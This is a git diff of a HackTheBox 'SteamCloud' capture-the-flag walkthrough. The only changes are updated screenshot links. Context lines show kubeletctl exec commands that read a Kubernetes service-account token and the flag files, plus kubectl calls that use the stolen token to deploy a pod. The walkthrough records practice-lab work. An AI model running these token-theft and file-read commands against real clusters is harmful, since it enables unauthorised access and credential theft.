@@ -5,7 +5,7 @@ kubeletctl --server steamcloud.htb exec "cat /var/run/secrets/kubernetes.io/serv
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/Kubelet%20tokke.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20tokke.png)
 
 ##  Look up certs
 ````
@@ -27,7 +27,7 @@ kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.1
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/Kubelet%20list%20listening%20pods.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20list%20listening%20pods.png)
 
 ##  list allowed commands
 ````
@@ -36,7 +36,7 @@ kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.1
 `````
 
 commands get, create and list are allowed
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/Kubelet%20list%20allowed%20commands.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20list%20allowed%20commands.png)
 
 ##  Create pod in the default namespace with yaml config file:
 ##  pod.yaml
@@ -64,7 +64,7 @@ spec:
 `````
 
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/yaml%20configuration%20file%20for%20Kubelet.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/yaml%20configuration%20file%20for%20Kubelet.png)
 
 ##  Kubelets apply custom pod.yaml file
 ````
@@ -72,7 +72,7 @@ kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.1
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/kubectl%20apply%20yaml%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubectl%20apply%20yaml%20file.png)
 
 ##  list listening/open pods
 ````
@@ -80,7 +80,7 @@ kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.1
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/kubectl%20list%20open%20pods.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubectl%20list%20open%20pods.png)
 
 ##  read user.txt
 ````
@@ -88,7 +88,7 @@ kubeletctl --server 10.10.11.133 exec "cat /root/home/user/user.txt" -p nginxt -
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/kubeletctl%20read%20user.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubeletctl%20read%20user.txt.png)
 
 ##  read root.txt
 ````
@@ -96,7 +96,7 @@ kubeletctl --server 10.10.11.133 exec "cat /root/root/root.txt" -p nginxt -c ngi
 
 `````
 
-![](https://github.com/xenotim/CTF/blob/main/SteamCloud/screenshots/kubeletctl%20read%20root.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubeletctl%20read%20root.txt.png)
 
 
 XXXXXXXXXXXXXXXX
